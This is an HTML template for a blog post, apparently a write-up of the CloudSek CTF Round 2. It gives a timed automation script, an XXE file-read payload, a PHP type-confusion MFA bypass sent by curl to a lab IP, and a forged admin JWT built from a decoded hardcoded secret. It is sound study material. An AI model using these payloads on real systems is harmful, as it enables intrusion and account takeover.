@@ -1,0 +1,380 @@
+<!-- templates/article_ctf_round2.html -->
+{% extends "base.html" %}
+
+{% block title %}CloudSek Hiring CTF Round 2 - Abishek Kumar{% endblock %}
+
+{% block content %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/custom.css') }}">
+
+<!-- Article Header -->
+<div class="max-w-4xl mx-auto">
+    <nav class="mb-8 scroll-reveal">
+        <a href="{{ url_for('articles') }}" class="inline-flex items-center text-blue-600 hover:text-blue-700">
+            <i class="fas fa-arrow-left mr-2"></i>
+            Back to Articles
+        </a>
+    </nav>
+
+    <article class="bg-white rounded-2xl shadow-lg overflow-hidden">
+        <!-- Header Section -->
+        <div class="bg-gradient-to-br from-blue-500 to-purple-600 p-12 text-white">
+            <div class="flex flex-wrap gap-2 mb-4">
+                <span class="px-3 py-1 bg-white/20 backdrop-blur-sm rounded-full text-sm font-medium">CTF Write-up</span>
+                <span class="px-3 py-1 bg-white/20 backdrop-blur-sm rounded-full text-sm font-medium">Web Security</span>
+                <span class="px-3 py-1 bg-white/20 backdrop-blur-sm rounded-full text-sm font-medium">Mobile Security</span>
+            </div>
+            <h1 class="text-4xl md:text-5xl font-bold mb-4">CTF Security Report - Round 2: Breaking Authentication, Parsing, and Mobile Security</h1>
+            <div class="flex items-center gap-6 text-blue-100">
+                <span><i class="fas fa-user mr-2"></i>Abishek Kumar</span>
+                <span><i class="fas fa-calendar mr-2"></i>December 2025</span>
+                <span><i class="fas fa-clock mr-2"></i>15 min read</span>
+            </div>
+        </div>
+
+        <!-- Content Section -->
+        <div class="p-8 md:p-12 prose prose-lg max-w-none dark:prose-invert">
+            
+            <h2>Introduction</h2>
+            <p>Welcome to my comprehensive write-up of the CloudSek Research Team CTF 2025 - Round 2. This challenge series presented four distinct security scenarios that mirror real-world vulnerabilities found in modern web applications and mobile platforms.</p>
+            
+            <p>Throughout this report, I'll demonstrate how seemingly small misconfigurations and overlooked security principles can lead to complete system compromise. Each challenge taught valuable lessons about:</p>
+            <ul>
+                <li><strong>Speed-based automation attacks</strong></li>
+                <li><strong>XML parsing vulnerabilities</strong></li>
+                <li><strong>Type confusion in authentication systems</strong></li>
+                <li><strong>Mobile application reverse engineering</strong></li>
+            </ul>
+
+            <div class="bg-blue-50 border-l-4 border-blue-500 p-6 my-8 dark:bg-gray-800 dark:border-blue-400">
+                <p class="font-semibold text-blue-900 dark:text-blue-300 mb-2">💡 Key Takeaway</p>
+                <p class="text-blue-800 dark:text-blue-200">All activities described in this write-up were conducted in a controlled CTF environment with proper authorization. Never attempt to exploit vulnerabilities in systems you don't own or have explicit permission to test.</p>
+            </div>
+
+            <hr class="my-12">
+
+            <h2>Challenge 1: NITRO - The Speed Demon 🚀</h2>
+            
+            <h3>The Challenge</h3>
+            <p>NITRO was a race against time. The server provided random strings and demanded transformed responses within a razor-thin time window of approximately 150 milliseconds. Any slower and you'd get the dreaded "Too slow" message.</p>
+
+            <h3>Understanding the Transformation</h3>
+            <p>The challenge required a specific transformation pipeline:</p>
+            <pre class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg overflow-x-auto"><code>Step 1: Fetch       → AbC123xyz
+Step 2: Reverse     → zyx321CbA  
+Step 3: Base64      → enl4MzIxQ2JBA==
+Step 4: Wrap        → CSK__enl4MzIxQ2JBA==__2025
+Step 5: Submit      → (within 150ms)</code></pre>
+
+            <h3>The Solution Script</h3>
+            <p>Manual interaction was impossible. I needed automation that could execute the entire pipeline in under 150 milliseconds:</p>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>import requests
+import base64
+import time
+
+def solve_nitro():
+    base_url = "http://target-server.com"
+    
+    while True:
+        try:
+            start_time = time.time()
+            
+            # Fetch the random string
+            task_response = requests.get(f"{base_url}/task", timeout=5)
+            random_string = task_response.text.strip()
+            
+            # Transform: Reverse → Base64 → Wrap
+            reversed_string = random_string[::-1]
+            encoded = base64.b64encode(reversed_string.encode()).decode()
+            payload = f"CSK__{encoded}__2025"
+            
+            # Submit immediately
+            submit_response = requests.post(
+                f"{base_url}/submit",
+                data={"answer": payload},
+                timeout=5
+            )
+            
+            elapsed = (time.time() - start_time) * 1000
+            print(f"[+] Submitted in {elapsed:.2f}ms")
+            
+            if "flag" in submit_response.text.lower():
+                print(f"\n[!] FLAG FOUND: {submit_response.text}")
+                break
+                
+        except Exception as e:
+            print(f"[-] Error: {e}")
+            time.sleep(1)</code></pre>
+
+            <div class="bg-green-50 border-l-4 border-green-500 p-6 my-8 dark:bg-gray-800 dark:border-green-400">
+                <p class="font-semibold text-green-900 dark:text-green-300 mb-2">✅ Key Takeaways</p>
+                <ul class="text-green-800 dark:text-green-200 list-disc pl-6">
+                    <li>Time-based challenges require automation - human reaction time is insufficient</li>
+                    <li>Network latency matters - every millisecond counts</li>
+                    <li>Script optimization is crucial for success</li>
+                </ul>
+            </div>
+
+            <hr class="my-12">
+
+            <h2>Challenge 2: BAD FEEDBACK - XXE in the Wild 🕷️</h2>
+            
+            <h3>Understanding XXE</h3>
+            <p>XML External Entity (XXE) injection is a vulnerability that allows attackers to:</p>
+            <ul>
+                <li><strong>Read arbitrary files</strong> from the server's filesystem</li>
+                <li><strong>Perform SSRF attacks</strong> to internal services</li>
+                <li><strong>Execute denial-of-service</strong> attacks</li>
+                <li><strong>Exfiltrate data</strong> through out-of-band channels</li>
+            </ul>
+
+            <h3>The Exploit Payload</h3>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY x SYSTEM "file:///flag.txt"&gt;
+]&gt;
+&lt;feedback&gt;
+  &lt;message&gt;&x;&lt;/message&gt;
+&lt;/feedback&gt;</code></pre>
+
+            <p><strong>How this works:</strong></p>
+            <ol>
+                <li><code>&lt;!DOCTYPE foo [...]&gt;</code> - Declares a custom document type definition</li>
+                <li><code>&lt;!ENTITY x SYSTEM "file:///flag.txt"&gt;</code> - Creates an external entity pointing to the flag file</li>
+                <li><code>&lt;message&gt;&x;&lt;/message&gt;</code> - References the entity, forcing the parser to read and expand the file contents</li>
+                <li>The server returns the file contents in its response</li>
+            </ol>
+
+            <div class="bg-yellow-50 border-l-4 border-yellow-500 p-6 my-8 dark:bg-gray-800 dark:border-yellow-400">
+                <p class="font-semibold text-yellow-900 dark:text-yellow-300 mb-2">⚠️ Prevention</p>
+                <p class="text-yellow-800 dark:text-yellow-200">Always disable external entity processing in XML parsers. Use secure parser configurations and consider using JSON instead, which doesn't suffer from entity expansion issues.</p>
+            </div>
+
+            <hr class="my-12">
+
+            <h2>Challenge 3: Triangle - Type Juggling Breaks MFA 🔺</h2>
+            
+            <h3>The Fatal Flaw</h3>
+            <p>Examining the OTP verification function revealed a critical vulnerability:</p>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>function verify_key($secret, $key) {
+    // CRITICAL VULNERABILITY
+    if (!is_string($key)) {
+        return true;  // Auto-accept non-strings!
+    }
+    
+    // Normal TOTP validation
+    $google2fa = new Google2FA();
+    return $google2fa->verifyKey($secret, $key);
+}</code></pre>
+
+            <h3>Understanding the Vulnerability</h3>
+            <p>This is a textbook example of <strong>type confusion</strong> in PHP:</p>
+            
+            <div class="grid md:grid-cols-2 gap-4 my-6">
+                <div class="bg-red-50 p-4 rounded-lg dark:bg-gray-800">
+                    <p class="font-semibold text-red-900 dark:text-red-300 mb-2">❌ Vulnerable Flow</p>
+                    <pre class="text-sm"><code>$otp = true;  // Boolean
+is_string($otp)  // FALSE  
+verify_key()  // Returns TRUE!</code></pre>
+                </div>
+                <div class="bg-green-50 p-4 rounded-lg dark:bg-gray-800">
+                    <p class="font-semibold text-green-900 dark:text-green-300 mb-2">✅ Intended Flow</p>
+                    <pre class="text-sm"><code>$otp = "123456";  // String
+is_string($otp)  // TRUE
+verify_key()  // TOTP validation</code></pre>
+                </div>
+            </div>
+
+            <h3>The Exploit</h3>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>curl -X POST http://15.206.47.5:8080/login \
+  -H "Content-Type: application/json" \
+  -d '{
+    "username": "admin",
+    "password": "admin123",
+    "otp1": true,
+    "otp2": true,
+    "otp3": true
+  }'</code></pre>
+
+            <p><strong>Result:</strong> Complete MFA bypass achieved without generating a single valid OTP!</p>
+
+            <hr class="my-12">
+
+            <h2>Challenge 4: Strike Bank - Mobile Security Nightmare 🏦</h2>
+            
+            <h3>Deep Dive: strings.xml Analysis</h3>
+            <p>The file <code>resources/res/values/strings.xml</code> contained sensitive information:</p>
+
+            <table class="w-full border-collapse border border-gray-300 my-6">
+                <thead class="bg-gray-100 dark:bg-gray-700">
+                    <tr>
+                        <th class="border border-gray-300 p-2">Line</th>
+                        <th class="border border-gray-300 p-2">Key</th>
+                        <th class="border border-gray-300 p-2">Severity</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="border border-gray-300 p-2">33</td>
+                        <td class="border border-gray-300 p-2">base_url</td>
+                        <td class="border border-gray-300 p-2 text-orange-600">High</td>
+                    </tr>
+                    <tr>
+                        <td class="border border-gray-300 p-2">91</td>
+                        <td class="border border-gray-300 p-2">encoded_jwt_secret</td>
+                        <td class="border border-gray-300 p-2 text-red-600 font-bold">Critical</td>
+                    </tr>
+                    <tr>
+                        <td class="border border-gray-300 p-2">105-106</td>
+                        <td class="border border-gray-300 p-2">credentials</td>
+                        <td class="border border-gray-300 p-2 text-orange-600">High</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Decoding the JWT Secret</h3>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>$ echo "c3RyIWszYjRua0AxMDA5JXN1cDNyIXMzY3IzNw==" | base64 -d
+str!k3b4nk@1009%sup3r!s3cr3t</code></pre>
+
+            <p class="font-bold text-lg text-red-600 dark:text-red-400">This is the master signing key for all JWT tokens in the application.</p>
+
+            <h3>Crafting the Exploit</h3>
+            <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>import jwt
+import time
+
+# The extracted secret
+secret = "str!k3b4nk@1009%sup3r!s3cr3t"
+
+# Forge an admin token
+payload = {
+    "username": "admin",
+    "role": "admin",
+    "exp": int(time.time()) + 3600
+}
+
+# Sign with HS256 algorithm
+token = jwt.encode(payload, secret, algorithm="HS256")
+print(f"Forged JWT: {token}")</code></pre>
+
+            <div class="bg-red-50 border-l-4 border-red-500 p-6 my-8 dark:bg-gray-800 dark:border-red-400">
+                <p class="font-semibold text-red-900 dark:text-red-300 mb-2">🚨 Impact Assessment</p>
+                <ul class="text-red-800 dark:text-red-200 list-disc pl-6">
+                    <li>Complete authentication bypass - No valid credentials needed</li>
+                    <li>Privilege escalation - Instant admin access</li>
+                    <li>Session hijacking - Can impersonate any user</li>
+                    <li>Data breach - Full access to internal systems</li>
+                </ul>
+            </div>
+
+            <p><strong>Flag captured:</strong> <code>ClOuDsEk_ReSeArCH_tEaM_CTF_2025{ccf62117a030691b1ac7013fca4fb685}</code></p>
+
+            <hr class="my-12">
+
+            <h2>Conclusion: Lessons from the Trenches</h2>
+            
+            <p>These four challenges from CloudSek Research Team CTF 2025 provided invaluable insights into real-world vulnerabilities that continue to plague modern applications.</p>
+
+            <h3>Summary of Vulnerabilities</h3>
+            <table class="w-full border-collapse border border-gray-300 my-6">
+                <thead class="bg-gray-100 dark:bg-gray-700">
+                    <tr>
+                        <th class="border border-gray-300 p-2">Challenge</th>
+                        <th class="border border-gray-300 p-2">Vulnerability</th>
+                        <th class="border border-gray-300 p-2">Impact</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="border border-gray-300 p-2">NITRO</td>
+                        <td class="border border-gray-300 p-2">Timing/Automation</td>
+                        <td class="border border-gray-300 p-2 text-orange-600">Medium</td>
+                    </tr>
+                    <tr>
+                        <td class="border border-gray-300 p-2">BAD FEEDBACK</td>
+                        <td class="border border-gray-300 p-2">XXE Injection</td>
+                        <td class="border border-gray-300 p-2 text-red-600 font-bold">Critical</td>
+                    </tr>
+                    <tr>
+                        <td class="border border-gray-300 p-2">Triangle</td>
+                        <td class="border border-gray-300 p-2">Type Confusion</td>
+                        <td class="border border-gray-300 p-2 text-red-600 font-bold">Critical</td>
+                    </tr>
+                    <tr>
+                        <td class="border border-gray-300 p-2">Strike Bank</td>
+                        <td class="border border-gray-300 p-2">Hardcoded Secrets</td>
+                        <td class="border border-gray-300 p-2 text-red-600 font-bold">Critical</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Universal Security Principles</h3>
+            <ol>
+                <li><strong>Validate Everything</strong> - Never trust input, regardless of source</li>
+                <li><strong>Fail Securely</strong> - When validation fails, reject access</li>
+                <li><strong>Defense in Depth</strong> - Multiple layers of security provide resilience</li>
+                <li><strong>Principle of Least Privilege</strong> - Grant minimal permissions necessary</li>
+                <li><strong>Security by Design</strong> - Consider security from the initial design phase</li>
+            </ol>
+
+            <div class="bg-blue-50 border-l-4 border-blue-500 p-6 my-8 dark:bg-gray-800 dark:border-blue-400">
+                <p class="font-semibold text-blue-900 dark:text-blue-300 mb-2">💭 Remember</p>
+                <p class="text-blue-800 dark:text-blue-200">A chain is only as strong as its weakest link. Security through obscurity is not security. The best time to fix security issues was at design time; the second-best time is now.</p>
+            </div>
+
+        </div>
+
+        <!-- Author Info -->
+        <div class="bg-gray-50 p-8 border-t dark:bg-gray-800">
+            <div class="flex items-center gap-4">
+                <div class="relative w-16 h-16 rounded-full overflow-hidden bg-white">
+                    <!-- Gradient fallback (shown while image loads) -->
+                    <div class="absolute inset-0 flex items-center justify-center bg-gradient-to-br from-blue-600 to-purple-600 text-white font-bold text-xl">
+                        AK
+                    </div>
+
+                    <!-- Profile image -->
+                    <img
+                        src="{{ url_for('static', filename='images/Abishek.jpeg') }}"
+                        alt="Abishek Kumar"
+                        class="absolute inset-0 w-full h-full object-cover"
+                    />
+                </div>
+                <div>
+                    <h3 class="font-bold text-lg dark:text-white">Abishek Kumar</h3>
+                    <p class="text-gray-600 dark:text-gray-300">Cybersecurity Researcher | Web Developer</p>
+                    <div class="flex gap-4 mt-2">
+                        <a href="https://www.linkedin.com/abishek--kumar" class="text-blue-600 hover:text-blue-700">
+                            <i class="fab fa-linkedin"></i> Linkedin
+                        </a>
+                        <a href="https://github.com/Abishek-Kumar-GHub" class="text-blue-600 hover:text-blue-700">
+                            <i class="fab fa-github"></i> GitHub
+                        </a>
+                        <a href="https://medium.com/@abishektechy" class="text-blue-600 hover:text-blue-700">
+                            <i class="fab fa-medium"></i> Medium
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <!-- Related Articles -->
+    <div class="mt-8 mb-12">
+        <h3 class="text-2xl font-bold text-gray-800 mb-4 dark:text-white">Related Articles</h3>
+        <div class="bg-white rounded-xl p-6 shadow-lg hover:shadow-xl transition-all">
+            <a href="{{ url_for('article_boot_sequence') }}" class="block">
+                <div class="flex items-center gap-4">
+                    <div class="w-16 h-16 bg-gradient-to-br from-indigo-500 to-purple-700 rounded-lg flex items-center justify-center text-white">
+                        <i class="fas fa-rocket text-2xl"></i>
+                    </div>
+                    <div>
+                        <h4 class="font-bold text-lg text-gray-800 dark:text-white">Boot Sequence - CloudSek Hiring CTF</h4>
+                        <p class="text-gray-600 text-sm dark:text-gray-300">JWT Forgery to SSTI Remote Code Execution</p>
+                    </div>
+                    <i class="fas fa-arrow-right ml-auto text-blue-600"></i>
+                </div>
+            </a>
+        </div>
+    </div>
+</div>
+
+{% endblock %}
